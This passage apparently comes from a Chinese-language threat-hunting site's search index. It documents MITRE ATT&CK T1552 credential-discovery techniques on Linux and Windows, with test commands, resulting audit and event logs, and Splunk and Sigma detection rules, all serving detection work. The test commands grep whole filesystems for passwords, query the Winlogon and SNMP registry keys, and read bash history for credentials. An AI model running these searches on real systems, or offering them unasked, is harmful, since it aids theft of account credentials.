87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>grep -riP password #{\u60f3\u8981\u67e5\u627e\u7684\u6587\u4ef6\u8def\u5f84}</p> <p>grep -riP password /</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09</p> <p>bash\u5386\u53f2\u8bb0\u5f55</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>icbc@icbc:/$ grep -riP passwd /etc/passwd</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#audit","title":"audit\u65e5\u5fd7","text":"<p>icbc@icbc:/$ gedit /var/log/audit/audit.log</p> <p>type=SYSCALL msg=audit(1563526266.080:744): arch=c000003e syscall=59 success=yes exit=0 a0=55f3435691b0 a1=55f3434345d0 a2=55f343573580 a3=8 items=2 ppid=2031 pid=4855 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=3 comm=\"grep\" exe=\"/usr/bin/grep\" key=\"auditcmd\" type=EXECVE msg=audit(1563526266.080:744): argc=5 a0=\"grep\" a1=\"--color=auto\" a2=\"-riP\" a3=\"passwd\" a4=\"/etc/passwd\" type=CWD msg=audit(1563526266.080:744): cwd=\"/\" type=PATH msg=audit(1563526266.080:744): item=0 name=\"/usr/bin/grep\" inode=2228723 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0</p> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u8fd9\u91cc\u53ea\u63d0\u53d6\u51fa\u4e86\u5f02\u5e38\u65e5\u5fd7\uff0c\u6545\u7701\u7565\u4e86\u5f88\u591a\u65e5\u5fd7\u7ec6\u8282\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#bash","title":"bash\u5386\u53f2\u8bb0\u5f55","text":"<p>icbc@icbc:/$ history</p> <p>1  grep -riP passwd /etc/passwd</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#splunk","title":"splunk\u89c4\u5219","text":"<p>audit\u65e5\u5fd7</p> <pre><code>index=linux sourcetype=linux_audit type=execve a0=grep   a0=\"grep\" a1=\"--color=auto\" a2=\"-riP\" a3=\"passwd\"\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#splunk_1","title":"splunk\u89c4\u5219","text":"<p>bash \u5386\u53f2\u8bb0\u5f55</p> <pre><code>index=linux sourcetype=\"bash_history\" grep password | table host,user_name,bash_command\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#sigma","title":"sigma\u89c4\u5219","text":"<p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u81ea\u884c\u914d\u7f6eAudit\u5ba1\u6838\u89c4\u5219</p> <pre><code>title: \u653b\u51fb\u8005\u67e5\u770blinux\u4e0b\u53ef\u80fd\u5305\u542b\u7528\u6237\u8d26\u6237\u5bc6\u7801\u7684\u6587\u4ef6\ndescription: Ubuntu18.04\nreferences: https://github.com/12306Bro/Threathunting/blob/master/T1081-linux-\u6587\u4ef6\u4e2d\u7684\u51ed\u8bc1.md\ntags: T1552-001\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n  product: linux\n  service: audit\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6eaudit\u89c4\u5219\uff09\ndetection:\n  keywords:\n\u200b    - comm=\"grep\" exe=\"/bin/grep\" key=\"audit_110\"\n  condition: keywords\n\nlogsource:\n  product: linux\n  service: history\ndetection:\n  selection:\n  keywords:\n\u200b    - grep * passwd\n  condition: keywords\nlevel: medium\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1552-001</p> <p>https://attack.mitre.org/techniques/T1552/001</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/","title":"T1552-001-win-\u6587\u4ef6\u4e2d\u7684\u51ed\u8bc1","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u548c\u8fdc\u7a0b\u6587\u4ef6\u5171\u4eab\u4e2d\u641c\u7d22\u5305\u542b\u5bc6\u7801\u7684\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u53ef\u4ee5\u662f\u7528\u6237\u521b\u5efa\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u5b58\u50a8\u81ea\u5df1\u7684\u51ed\u8bc1\uff0c\u4e00\u7ec4\u5171\u4eab\u7684\u51ed\u8bc1\uff0c\u5305\u542b\u7cfb\u7edf\u6216\u670d\u52a1\u5bc6\u7801\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u6216\u5305\u542b\u5d4c\u5165\u5bc6\u7801\u7684\u6e90\u4ee3\u7801/\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002</p> <p>\u53ef\u4ee5\u901a\u8fc7\u7a83\u53d6\u51ed\u8bc1\u6280\u672f\u4ece\u5907\u4efd\u6216\u4fdd\u5b58\u7684\u865a\u62df\u673a\u4e2d\u63d0\u53d6\u5bc6\u7801\u3002\u4e5f\u53ef\u4ee5\u4ece\u5b58\u50a8\u5728Windows\u57df\u63a7\u5236\u5668\u4e0a\u7684\u7ec4\u7b56\u7565\u9996\u9009\u9879\u83b7\u53d6\u5bc6\u7801\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>findstr\u662fwindow\u7cfb\u7edf\u81ea\u5e26\u7684\u547d\u4ee4\uff0c\u7528\u9014\u662f\u67e5\u627e\u6307\u5b9a\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u6587\u4ef6\u6587\u4ef6\u4e2d\u5305\u542b\uff08\u6216\u901a\u8fc7\u53c2\u6570 /V\u6765\u63a7\u5236\u4e0d\u5305\u542b\uff09\u67d0\u4e9b\u7279\u5b9a\u5b57\u7b26\u4e32\u7684\u884c\uff0c\u5e76\u5c06\u8be5\u884c\u5b8c\u6574\u7684\u4fe1\u606f\u6253\u5370\u51fa\u6765\uff0c\u6216\u8005\u6253\u5370\u67e5\u8be2\u5b57\u7b26\u4e32\u6240\u5728\u7684\u6587\u4ef6\u540d\u3002\u5176\u7528\u9014\u548c\u7528\u6cd5\u90fd\u7c7b\u4f3clinux\u4e0b\u7684grep\u547d\u4ee4\u3002</p> <p>findstr\u547d\u4ee4\u5177\u4f53\u7528\u6cd5\u53ef\u53c2\u8003\u5fae\u8f6f\u76f8\u5173\u8bf4\u660e\uff1ahttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>C:\\Users\\Administrator&gt;findstr /ni /c:\"password\" test.txt\n19:password\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u65e5\u5fd7</p> <pre><code>\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\n\n\u521b\u5efa\u8005\u4e3b\u9898:\n \u5b89\u5168 ID:  QAX\\Administrator\n \u5e10\u6237\u540d:  Administrator\n \u5e10\u6237\u57df:  QAX\n \u767b\u5f55 ID:  0x7169C\n\n\u76ee\u6807\u4e3b\u9898:\n \u5b89\u5168 ID:  NULL SID\n \u5e10\u6237\u540d:  -\n \u5e10\u6237\u57df:  -\n \u767b\u5f55 ID:  0x0\n\n\u8fdb\u7a0b\u4fe1\u606f:\n \u65b0\u8fdb\u7a0b ID:  0xc14\n \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\findstr.exe\n \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1936\n \u5f3a\u5236\u6027\u6807\u7b7e:  Mandatory Label\\High Mandatory Level\n \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x304\n \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe\n \u8fdb\u7a0b\u547d\u4ee4\u884c: findstr  /ni /c:\"password\" test.txt\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#sigma","title":"Sigma\u89c4\u5219","text":"<pre><code>title: widnows\u4e0b\u5229\u7528findstr\u547d\u4ee4\u67e5\u627e\u7528\u6237\u51ed\u8bc1\nstatus: \u6d4b\u8bd5\u9636\u6bb5\ndescription: \u5229\u7528findstr\u547d\u4ee4\u67e5\u627e\u6307\u5b9a\u6587\u4ef6\u5185\u5305\u542bpassword\u5173\u952e\u8bcd\u4fe1\u606f\ntags:\n    - attack.t1552-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Eventid:\n            - 4688 #\u8fdb\u7a0b\u521b\u5efa\uff0cwindows \u5b89\u5168\u65e5\u5fd7\uff0cWindows server 2012\u53ca\u4ee5\u4e0a\u7248\u672c\u914d\u7f6e\u76f8\u5173\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u8bb0\u5f55\u7cfb\u7edf\u547d\u4ee4\u884c\u53c2\u6570\n        CommandLine|contains|all: \n            - 'findstr'\n            - 'password'\n    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_6","title":"\u5efa\u8bae","text":"<p>\u867d\u7136\u5728\u4e0d\u77e5\u9053\u5b83\u4eec\u6700\u521d\u5b58\u5728\u7684\u60c5\u51b5\u4e0b\uff0c\u68c0\u6d4b\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e9b\u6587\u4ef6\u53ef\u80fd\u5f88\u56f0\u96be\uff0c\u4f46\u53ef\u4ee5\u68c0\u6d4b\u5230\u653b\u51fb\u8005\u5bf9\u5b83\u4eec\u5df2\u83b7\u53d6\u7684\u51ed\u636e\u7684\u4f7f\u7528\u3002\u76d1\u89c6\u6b63\u5728\u6267\u884c\u7684\u8fdb\u7a0b\u7684\u547d\u4ee4\u884c\u53c2\u6570\u4e2d\u662f\u5426\u6709\u53ef\u7591\u5b57\u8bcd\u6216\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5b83\u4eec\u8868\u793a\u653b\u51fb\u8005\u53ef\u80fd\u6b63\u5728\u641c\u7d22\u5bc6\u7801\uff08\u4f8b\u5982\uff1apassword\uff0cpwd\uff0clogin\uff0csecure\uff09\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1552-001</p> <p>https://attack.mitre.org/techniques/T1552/001</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/","title":"T1552-002-win-\u6ce8\u518c\u8868\u4e2d\u7684\u51ed\u8bc1","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>Windows\u6ce8\u518c\u8868\u5b58\u50a8\u7cfb\u7edf\u6216\u5176\u4ed6\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u7528\u7684\u914d\u7f6e\u4fe1\u606f\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u67e5\u8be2\u6ce8\u518c\u8868\uff0c\u4ee5\u67e5\u627e\u5df2\u5b58\u50a8\u4f9b\u5176\u4ed6\u7a0b\u5e8f\u6216\u670d\u52a1\u4f7f\u7528\u7684\u51ed\u636e\u548c\u5bc6\u7801\u3002\u6709\u65f6\uff0c\u8fd9\u4e9b\u51ed\u636e\u7528\u4e8e\u81ea\u52a8\u767b\u5f55\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u67e5\u627e\u4e0e\u5bc6\u7801\u4fe1\u606f\u76f8\u5173\u7684\u6ce8\u518c\u8868\u9879\u7684\u793a\u4f8b\u547d\u4ee4\uff1a</p> <pre><code>\u672c\u5730\u673a\u5668\u914d\u7f6e\u5355\u5143\uff1a reg query HKLM /f password /t REG_SZ /s\n\u5f53\u524d\u7528\u6237\u914d\u7f6e\u5355\u5143\uff1a reg query HKCU /f password /t REG_SZ /s\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>Windows Sysmon\u65e5\u5fd7</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>Windows \u81ea\u52a8\u767b\u9646\uff1a</p> <pre><code>reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"\n</code></pre> <p>SNMP \u76f8\u5173\u53c2\u6570\uff1a</p> <pre><code>reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>Windows Sysmon\u65e5\u5fd7 \u4e8b\u4ef61\uff0c\u547d\u4ee4\u884c\u53c2\u6570\u7b49</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u6ce8\u518c\u8868\u4e2d\u7684\u51ed\u8bc1\u679a\u4e3e\ndescription: win7\u6d4b\u8bd5\nreferences: http://www.rinige.com/index.php/archives/770/\ntags: T1552-002\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 1  #\u8fdb\u7a0b\u521b\u5efa\n        Image: 'C:\\*\\reg.exe'\n        OriginalFileName: reg.exe\n        CommandLine: 'reg  query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"'\n        ParentCommandLine: \"C:\\*\\cmd.exe\"\n    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1552-002</p> <p>https://attack.mitre.org/techniques/T1552/002/</p> <p>T1214\u6a21\u62df\u6d4b\u8bd5</p> <p>https://ired.team/offensive-security/credential-access-and-credential-dumping/t1214-credentials-in-registry</p> <p>\u6e17\u900f\u6d4b\u8bd5\u4e2d\u9700\u8981\u5173\u6ce8\u7684\u672c\u5730\u51ed\u636e</p> <p>http://www.rinige.com/index.php/archives/770/</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/","title":"T1552-003-linux-Bash\u5386\u53f2\u8bb0\u5f55","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>Bash\u4f7f\u7528\u201chistory\u201d\u5b9e\u7528\u7a0b\u5e8f\u8ddf\u8e2a\u7528\u6237\u5728\u547d\u4ee4\u884c\u4e0a\u952e\u5165\u7684\u547d\u4ee4\u3002\u7528\u6237\u6ce8\u9500\u540e\uff0c\u4f1a\u5c06\u5386\u53f2\u8bb0\u5f55\u5237\u65b0\u5230\u7528\u6237\u7684<code>.bash_history</code>\u6587\u4ef6\u4e2d\u3002\u5bf9\u4e8e\u6bcf\u4e2a\u7528\u6237\uff0c\u6b64\u6587\u4ef6\u4f4d\u4e8e\u540c\u4e00\u4f4d\u7f6e\uff1a<code>~/.bash_history</code>\u3002\u901a\u5e38\uff0c\u6b64\u6587\u4ef6\u4f1a\u8ddf\u8e2a\u7528\u6237\u7684\u6700\u8fd1500\u4e2a\u547d\u4ee4\u3002\u7528\u6237\u901a\u5e38\u5728\u547d\u4ee4\u884c\u4e0a\u952e\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801\u4f5c\u4e3a\u7a0b\u5e8f\u7684\u53c2\u6570\uff0c\u7136\u540e\u5728\u6ce8\u9500\u65f6\u5c06\u5176\u4fdd\u5b58\u5230\u6b64\u6587\u4ef6\u4e2d\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6ee5\u7528\u6b64\u529f\u80fd\u6765\u67e5\u770b\u6587\u4ef6\u6765\u67e5\u770b\u6f5c\u5728\u51ed\u636e\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>cat #{bash\u5386\u53f2\u547d\u4ee4\u540d\u5b57} | grep #{bash\u5386\u53f2\u547d\u4ee4\u5173\u952e\u8bcd\u68c0\u7d22} &gt; #{\u8f93\u51fa\u6587\u4ef6\u540d}</p> <p>sudo cat  ~/.bash_history | grep password &gt; bash.txt</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09</p> <p>bash\u5386\u53f2\u8bb0\u5f55</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>icbc@icbc:/$ sudo cat ~/.bash_history | grep password &gt; bash.txt</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#audit","title":"audit\u65e5\u5fd7","text":"<p>icbc@icbc:/$ sudo cat ~/.bash_history | grep password &gt; bash.txt</p> <p>type=PATH msg=audit(1563528127.048:1097): item=0 name=\"/usr/bin/cat\" inode=2228383 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 type=PATH msg=audit(1563528127.048:1097): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=2237074 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 type=PROCTITLE msg=audit(1563528127.048:1097): proctitle=636174002F726F6F742F2E626173685F686973746F7279 type=SYSCALL msg=audit(1563528127.056:1099): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffd4ebbb73b a2=0 a3=0 items=1 ppid=5249 pid=5258 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm=\"cat\" exe=\"/usr/bin/cat\" key=\"bash_history_110\" type=CWD msg=audit(1563528127.056:1099): cwd=\"/root\"</p> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u8fd9\u91cc\u53ea\u63d0\u53d6\u51fa\u4e86\u5f02\u5e38\u65e5\u5fd7\uff0c\u6545\u7701\u7565\u4e86\u5f88\u591a\u65e5\u5fd7\u7ec6\u8282\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#bash","title":"bash\u5386\u53f2\u8bb0\u5f55","text":"<p>icbc@icbc:/$ history</p> <p>1  sudo cat ~/.bash_history | grep password &gt; bash.txt</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#splunk","title":"splunk\u89c4\u5219","text":"<p>audit \u65e5\u5fd7</p> <pre><code>index=linux sourcetype=\"linux_audit\" syscall=257 key=bash_history_110 | table host,auid,syscall,syscall_name,exe\n</code></pre> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u81ea\u884c\u914d\u7f6eAudit\u5ba1\u6838\u89c4\u5219</p> <pre><code>sudo auditctl -w ~/.bash_history -k bash_history_110\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#splunk_1","title":"splunk\u89c4\u5219","text":"<p>bash \u5386\u53f2\u8bb0\u5f55</p> <pre><code>index=linux sourcetype=bash_history cat bash_history | table _time,host,user_name,bash_command\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u653b\u51fb\u8005\u8bfb\u53d6linux\u4e0b~/.bash_history\u6587\u4ef6\uff0c\u67e5\u770b\u662f\u5426\u5305\u542b\u76f8\u5173\u51ed\u636e\u5bc6\u7801\ndescription: Ubuntu18.04\nreferences: https://github.com/12306Bro/Threat-hunting/blob/master/T1139-linux-Bash\u5386\u53f2\u8bb0\u5f55.md\ntags: T1552-003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u200b    product: linux\n\u200b    service: audit\ndetection:\n\u200b    keywords:\n\u200b       - syscall=257 key=bash_history_110\n\u200b    condition: keywords\n----------------------------------------------------------------------------------------\nlogsource:\n\u200b    product: linux\n\u200b    service: history\ndetection:\n\u200b    selection:\n\u200b    keywords:\n\u200b       - cat bash_history\n\u200b    condition: keywords\nlevel: medium\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1552-003</p> <p>https://attack.mitre.org/techniques/T1552/003/</p> <p>Audit\u914d\u7f6e\u624b\u518c</p> 